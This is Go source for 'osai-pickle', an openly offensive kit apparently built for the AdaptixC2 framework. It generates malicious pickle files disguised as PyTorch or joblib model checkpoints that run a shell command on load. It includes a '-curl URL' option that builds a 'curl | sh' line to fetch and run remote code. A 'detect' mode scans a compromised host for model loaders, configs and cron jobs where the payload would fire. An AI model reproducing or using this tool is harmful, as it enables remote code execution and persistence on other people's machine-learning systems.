// Command osai-pickle is the OSAI pickle-RCE kit: a payload generator (gen) and
// a trigger-surface detector (detect). It gives the AdaptixC2 gopher (Linux)
// agent the ability to craft a malicious pickle checkpoint and to find out
// whether a target's model loader will actually honor it — without touching
// Python on the foothold.
//
// Subcommands:
//
//	osai-pickle gen   [-fmt pickle|torch|joblib] [-fn system|popen]
//	                  (-cmd CMD | -curl URL | -probe PATH) [-o FILE]
//	    Emit a malicious pickle blob. -fmt pickle (default) is a bare pickle
//	    stream (fires under pickle.load / joblib.load and torch.load's legacy
//	    fallback). -fmt torch wraps it as a zip with data.pkl (fires under
//	    torch.load with weights_only=False). -fmt joblib wraps it as a joblib
//	    zip. -fn popen (default) is non-blocking; -fn system blocks briefly.
//
//	osai-pickle detect [ROOT...]   (default ROOTs: /opt /srv /app /home ...)
//	    Walk the host and surface the pickle-RCE trigger surface: pickle-
//	    loadable model files, safetensors/onnx-only dirs (vector dead),
//	    loader code lines (pickle.load / torch.load / weights_only ...),
//	    active-model config keys, and cron/scheduled loaders.
//
// Single static Go binary. No Python, no child processes.
package main

import (
	"archive/zip"
	"bytes"
	"flag"
	"fmt"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

var banner = strings.Repeat("=", 44)

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}
	switch os.Args[1] {
	case "gen":
		runGen(os.Args[2:])
	case "detect":
		runDetect(os.Args[2:])
	case "-h", "--help", "help":
		usage()
	default:
		fmt.Fprintf(os.Stderr, "unknown subcommand %q\n", os.Args[1])
		usage()
		os.Exit(2)
	}
}

func usage() {
	fmt.Fprintf(os.Stderr, `osai-pickle — OSAI pickle-RCE kit (gen + detect)

  osai-pickle gen   [-fmt pickle|torch|joblib] [-fn system|popen]
                    (-cmd CMD | -curl URL | -probe PATH) [-o FILE]
  osai-pickle detect [ROOT ...]

gen emits a malicious pickle blob; detect finds the trigger surface.
`)
}

// ─── gen ─────────────────────────────────────────────────────────────────────

func runGen(args []string) {
	fs := flag.NewFlagSet("gen", flag.ExitOnError)
	fmt_ := fs.String("fmt", "pickle", "output format: pickle|torch|joblib")
	fn := fs.String("fn", "popen", "gadget: popen (non-blocking) | system (blocks)")
	cmd := fs.String("cmd", "", "shell command to run on load")
	curl := fs.String("curl", "", "URL to curl|sh on load (builds the command for you)")
	probe := fs.String("probe", "", "path to write a pwned-marker on load (confirms RCE context)")
	out := fs.String("o", "", "write to FILE (default stdout)")
	_ = fs.Parse(args)

	payload := ""
	switch {
	case *cmd != "":
		payload = *cmd
	case *curl != "":
		// validate URL shape so a typo doesn't produce a broken payload
		if _, err := url.Parse(*curl); err != nil {
			fmt.Fprintf(os.Stderr, "gen: bad -curl url: %v\n", err)
			os.Exit(2)
		}
		payload = fmt.Sprintf("curl -fsSL %s | sh", *curl)
	case *probe != "":
		// marker includes user + host so reading it back proves which context fired
		payload = fmt.Sprintf(`echo "pwned-$(id -un)@$(hostname)" > %s`, *probe)
	default:
		fmt.Fprintln(os.Stderr, "gen: specify one of -cmd / -curl / -probe")
		fs.Usage()
		os.Exit(2)
	}
	if *fn != "popen" && *fn != "system" {
		fmt.Fprintf(os.Stderr, "gen: -fn must be popen or system (got %q)\n", *fn)
		os.Exit(2)
	}
	if *fmt_ != "pickle" && *fmt_ != "torch" && *fmt_ != "joblib" {
		fmt.Fprintf(os.Stderr, "gen: -fmt must be pickle|torch|joblib (got %q)\n", *fmt_)
		os.Exit(2)
	}

	pkl := buildPickle(*fn, payload)

	var blob []byte
	desc := ""
	switch *fmt_ {
	case "pickle":
		blob = pkl
		desc = "raw pickle stream (pickle.load / joblib.load / torch.load legacy fallback)"
	case "torch":
		blob = torchZip(pkl)
		desc = "torch .pt zip (archive/data.pkl) — needs torch.load(weights_only=False)"
	case "joblib":
		blob = withFrame(pkl) // joblib.dump emits a raw PROTO-4+FRAME pickle, not a zip
		desc = "raw PROTO-4 pickle (joblib.dump shape) — fires under joblib.load"
	}

	if *out == "" {
		os.Stdout.Write(blob)
	} else {
		if err := os.WriteFile(*out, blob, 0644); err != nil {
			fmt.Fprintf(os.Stderr, "gen: write %s: %v\n", *out, err)
			os.Exit(1)
		}
	}
	// a short human-readable summary goes to stderr so it doesn't corrupt stdout
	// when the blob itself is being piped/redirected
	fmt.Fprintf(os.Stderr, "[gen] fn=%s fmt=%s -> %d bytes  (%s)\n", *fn, *fmt_, len(blob), desc)
	fmt.Fprintf(os.Stderr, "[gen] payload: %s\n", payload)
	if *out != "" {
		fmt.Fprintf(os.Stderr, "[gen] wrote %s — drop on target as the model file the loader reads\n", *out)
	} else {
		fmt.Fprintf(os.Stderr, "[gen] wrote blob to stdout (redirect with -o to save to a file)\n")
	}
}

// buildPickle hand-crafts a pickle stream that calls fn(payload) on load.
//
//	All protocol-1/4 opcodes (avoids the proto-0 GLOBAL opcode, which trips
//	joblib's NpyUnpickler with "persistent IDs in protocol 0"):
//	  \x8c <n> ...  SHORT_BINUNICODE (1-byte len, <=255) — module/class/short str
//	  \x93           STACK_GLOBAL   pop name, module -> find_class(module, name)
//	  (              MARK
//	  X <n:u32> ...  BINUNICODE     (4-byte LE len, any size) — the payload
//	  t              TUPLE          pop since mark -> tuple
//	  R              REDUCE         pop (args, callable) -> push callable(*args)
//	  .              STOP
//
// popen : subprocess.Popen(("bash","-c",payload))  -- returns immediately
// system: os.system(payload)                       -- blocks until exit
func buildPickle(fn, payload string) []byte {
	var b bytes.Buffer
	switch fn {
	case "system":
		b.Write(shortBin("os"))
		b.Write(shortBin("system"))
		b.WriteString("\x93(") // STACK_GLOBAL, MARK
		b.WriteByte(0x58)      // BINUNICODE (4-byte LE len)
		b.Write(u32le(uint32(len(payload))))
		b.WriteString(payload)
		b.WriteString("tR.")
	case "popen":
		b.Write(shortBin("subprocess"))
		b.Write(shortBin("Popen"))
		// REDUCE does Popen(*args), so args must be a 1-tuple whose single
		// element is the ("bash","-c",payload) command sequence. Two marks +
		// two tuples: outer ( ... ) wraps the inner ("bash","c",payload).
		b.WriteString("\x93((") // STACK_GLOBAL, MARK_outer, MARK_inner
		b.Write(shortBin("bash"))
		b.Write(shortBin("-c"))
		b.WriteByte(0x58) // BINUNICODE (4-byte LE len)
		b.Write(u32le(uint32(len(payload))))
		b.WriteString(payload)
		b.WriteString("ttR.") // inner TUPLE, outer TUPLE, REDUCE
	}
	return b.Bytes()
}

// shortBin emits a SHORT_BINUNICODE opcode (0x8c) + 1-byte length + the string.
func shortBin(s string) []byte {
	if len(s) > 255 {
		// fall back to BINUNICODE (0x58, 4-byte len) for an over-long name
		return append(append([]byte{0x58}, u32le(uint32(len(s)))...), []byte(s)...)
	}
	return append([]byte{0x8c, byte(len(s))}, []byte(s)...)
}

func u32le(v uint32) []byte {
	return []byte{byte(v), byte(v >> 8), byte(v >> 16), byte(v >> 24)}
}

// withFrame wraps a pickle body in a PROTO-4 + FRAME header so the output looks
// like a native joblib.dump file (which emits raw \x80\x04\x95... not a zip).
func withFrame(pkl []byte) []byte {
	var b bytes.Buffer
	b.WriteByte(0x80) // PROTO
	b.WriteByte(0x04)
	b.WriteByte(0x95) // FRAME
	v := uint64(len(pkl))
	for i := 0; i < 8; i++ {
		b.WriteByte(byte(v >> (8 * uint(i))))
	}
	b.Write(pkl)
	return b.Bytes()
}

// torchZip wraps a pickle stream as a torch .pt zip under an "archive/" prefix.
// torch 2.x's PyTorchFileReader requires (a) every member under a top-level dir
// and (b) a "version" record (+ a few metadata records) or it fails with
// hasRecord("version") == false. The standard set (dumped by torch.save 2.13):
// archive/data.pkl, archive/version ("3\n"), archive/.format_version ("1"),
// archive/byteorder ("little"), archive/.storage_alignment ("64"). No data/
// member is needed — the gadget's REDUCE fires during unpickle of data.pkl,
// before any storage is touched. (weights_only=True still blocks this; that's
// what detect flags.)
func torchZip(pkl []byte) []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	put := func(name string, data []byte) {
		if w, err := zw.Create(name); err == nil {
			_, _ = w.Write(data)
		}
	}
	put("archive/data.pkl", pkl)
	put("archive/version", []byte("3\n"))
	put("archive/.format_version", []byte("1"))
	put("archive/byteorder", []byte("little"))
	put("archive/.storage_alignment", []byte("64"))
	_ = zw.Close()
	return buf.Bytes()
}

// ─── detect ──────────────────────────────────────────────────────────────────

var defaultRoots = []string{
	"/opt", "/srv", "/app", "/home", "/var/www", "/etc", "/var/lib", "/root",
	"/workspace", "/models", "/ml",
}

var skipDirs = map[string]bool{
	"proc": true, "sys": true, "dev": true, "run": true, "tmp": true,
	"node_modules": true, ".git": true, "site-packages": true,
	"__pycache__": true, "venv": true, ".venv": true, "env": true,
	"dist": true, "build": true, ".cache": true, ".npm": true,
}

// pickle-loadable model formats (RCE-relevant). safetensors/onnx/h5 are NOT.
var pickleExts = map[string]bool{
	"pt": true, "pth": true, "pkl": true, "ckpt": true, "joblib": true,
	"pickle": true, "npy": true, // npy is fine but np.load allow_pickle=True is RCE
}

// explicitly-safe formats — a model dir with ONLY these is a dead pickle vector
var safeExts = map[string]bool{
	"safetensors": true, "onnx": true, "h5": true, "tflite": true,
	"pb": true, "keras": true, "mlmodel": true,
}

// strings to grep in .py loader code
var pyLoaders = []string{
	"pickle.load", "pickle.loads", "torch.load", "joblib.load", "pkl.load",
	"numpy.load", "np.load", "load_model", "tf.saved_model", "tf.keras",
	"safetensors", "weights_only", "allow_pickle", "cloudpickle", "dill.load",
}

// config keys that name the active model / checkpoint path. Compounds only —
// bare "checkpoint"/"resume" match too much non-model text (Cargo features,
// wordlists) on a noisy host.
var configKeys = []string{
	"active_model", "model_path", "model_dir", "model_name", "model_file",
	"latest_checkpoint", "best_model", "load_model",
	"weights_path", "checkpoint_path", "ckpt_path", "init_from",
	"_epoch_", "_checkpoint", "model_checkpoint",
}

// cron / scheduled-loader keywords
var cronKeywords = []string{
	"pickle", "torch.load", "joblib", "python", "python3", "refresher",
	"loader", "reload", "load_model", "mlflow", "checkpoint",
}

const (
	maxModelFiles = 120
	maxPyFiles    = 250
	maxHitsPerPy  = 4
	maxCfgHits    = 80
	maxTotalHits  = 200
	scanCap       = 256 * 1024
)

func runDetect(args []string) {
	roots := defaultRoots
	if len(args) > 0 {
		roots = args
	}

	fmt.Printf("\n%s\n      OSAI Pickle-RCE Trigger Detect (osai-pickle detect)\n%s\n", banner, banner)
	fmt.Printf("[*] roots: %s\n\n", strings.Join(roots, " "))

	// per-directory pickle vs safe-format counts (for the safetensors-only flag)
	dirPickle := map[string]int{}
	dirSafe := map[string]int{}

	modelCount, pyCount := 0, 0
	cfgHits, pyHits, cronHits := 0, 0, 0
	totalHits := 0

	for _, root := range roots {
		_, err := os.Stat(root)
		if err != nil {
			continue
		}
		filepath.WalkDir(root, func(p string, d os.DirEntry, err error) error {
			if err != nil {
				return nil
			}
			if d.IsDir() {
				name := d.Name()
				if skipDirs[name] {
					return filepath.SkipDir
				}
				return nil
			}
			// totalHits guard short-circuits the expensive scans
			if totalHits >= maxTotalHits {
				return filepath.SkipDir
			}
			name := d.Name()
			ext := strings.ToLower(strings.TrimPrefix(filepath.Ext(name), "."))
			dir := filepath.Dir(p)

			// 1. model files
			if pickleExts[ext] {
				if modelCount < maxModelFiles {
					fmt.Printf("  [model]   %s\n", p)
				}
				modelCount++
				dirPickle[dir]++
				totalHits++
				return nil
			}
			if safeExts[ext] {
				dirSafe[dir]++
				return nil
			}
			if name == "MLmodel" || name == "model.pkl" {
				fmt.Printf("  [mlflow]  %s  (MLflow model artifact dir)\n", dir)
				dirPickle[dir]++
				totalHits++
				return nil
			}

			// 2. python loader code
			if ext == "py" || ext == "ipynb" {
				if pyCount >= maxPyFiles {
					return nil
				}
				pyCount++
				h := scanFile(p, pyLoaders, maxHitsPerPy)
				for _, line := range h {
					dead, alive := weightsOnly(line)
					tag := ""
					if dead {
						tag = "  <-- weights_only=True: VECTOR DEAD here"
					} else if alive {
						tag = "  <-- weights_only=False: VECTOR ALIVE"
					}
					fmt.Printf("  [loader]  %s:%s%s\n", p, trim(line, 140), tag)
					pyHits++
					totalHits++
					if totalHits >= maxTotalHits {
						break
					}
				}
				return nil
			}

			// 3. config files naming the active model
			if isConfig(ext, name) {
				if cfgHits >= maxCfgHits {
					return nil
				}
				h := scanFile(p, configKeys, maxHitsPerPy)
				for _, line := range h {
					fmt.Printf("  [cfg]     %s: %s\n", p, trim(line, 120))
					cfgHits++
					totalHits++
					if totalHits >= maxTotalHits {
						break
					}
				}
			}
			return nil
		})
	}

	// safetensors/onnx-only model dirs -> dead vector
	safeOnly := 0
	for dir, s := range dirSafe {
		if s > 0 && dirPickle[dir] == 0 {
			fmt.Printf("  [safe-only] %s  — only safetensors/onnx/h5 found here, pickle RCE likely DEAD\n", dir)
			safeOnly++
		}
	}

	// 4. cron / scheduled loaders
	cronHits = scanCron(roots)

	fmt.Printf("\n[*] summary: %d model file(s), %d loader-line(s), %d config-key(s), %d cron-line(s), %d safetensors-only dir(s)\n",
		modelCount, pyHits, cfgHits, cronHits, safeOnly)
	if modelCount == 0 && pyHits == 0 && cfgHits == 0 {
		fmt.Printf("[*] no pickle trigger surface found under the given roots\n")
	}
}

func isConfig(ext, name string) bool {
	switch ext {
	case "cfg", "yaml", "yml", "ini", "toml", "conf", "env", "txt", "json", "properties":
		return true
	}
	return name == "Dockerfile" || name == "Modelfile" || name == ".env"
}

// scanFile returns up to max matching lines (trimmed) from the first scanCap bytes.
func scanFile(path string, needles []string, max int) []string {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	limited := io.LimitReader(f, scanCap)
	data, _ := io.ReadAll(limited)
	var out []string
	for _, raw := range strings.Split(string(data), "\n") {
		line := strings.TrimSpace(raw)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		for _, n := range needles {
			if strings.Contains(line, n) {
				out = append(out, line)
				break
			}
		}
		if len(out) >= max {
			break
		}
	}
	return out
}

// weightsOnly returns (dead, alive) flags for a loader line mentioning weights_only.
func weightsOnly(line string) (dead, alive bool) {
	if !strings.Contains(line, "weights_only") {
		return false, false
	}
	low := strings.ToLower(line)
	if strings.Contains(low, "weights_only=true") || strings.Contains(low, "weights_only= true") ||
		strings.Contains(low, "weights_only: true") {
		return true, false
	}
	if strings.Contains(low, "weights_only=false") || strings.Contains(low, "weights_only= false") ||
		strings.Contains(low, "weights_only: false") {
		return false, true
	}
	return false, false
}

// scanCron reads scheduled-loader files for pickle/torch.load/python keywords.
// It scans the absolute system cron paths AND <root>/etc/cron.d, <root>/etc/crontab,
// <root>/var/spool/cron for each root, so it works on a live foothold (absolute)
// and under a chroot/test tree (root-relative). A seen-set dedupes overlaps.
func scanCron(roots []string) int {
	hits := 0
	seen := map[string]bool{}
	var files []string
	add := func(p string) {
		if !seen[p] {
			seen[p] = true
			files = append(files, p)
		}
	}
	// absolute system paths
	add("/etc/crontab")
	for _, p := range glob("/etc/cron.d/*") {
		add(p)
	}
	for _, p := range glob("/var/spool/cron/*") {
		add(p)
	}
	for _, p := range glob("/var/spool/cron/crontabs/*") {
		add(p)
	}
	// root-relative paths (for chroot/test trees and non-standard roots)
	for _, r := range roots {
		add(filepath.Join(r, "etc/crontab"))
		for _, p := range glob(filepath.Join(r, "etc/cron.d/*")) {
			add(p)
		}
		for _, p := range glob(filepath.Join(r, "var/spool/cron/*")) {
			add(p)
		}
		for _, p := range glob(filepath.Join(r, "var/spool/cron/crontabs/*")) {
			add(p)
		}
	}
	for _, f := range files {
		h := scanFile(f, cronKeywords, 6)
		for _, line := range h {
			fmt.Printf("  [cron]    %s: %s\n", f, trim(line, 120))
			hits++
		}
	}
	return hits
}

func glob(pat string) []string {
	m, err := filepath.Glob(pat)
	if err != nil {
		return nil
	}
	return m
}

func trim(s string, n int) string {
	s = strings.TrimSpace(s)
	if len(s) > n {
		return s[:n] + "..."
	}
	return s
}

// keep io imported (used via LimitReader in scanFile) — also silence unused warnings
var _ = io.EOF
var _ = runtime.GOOS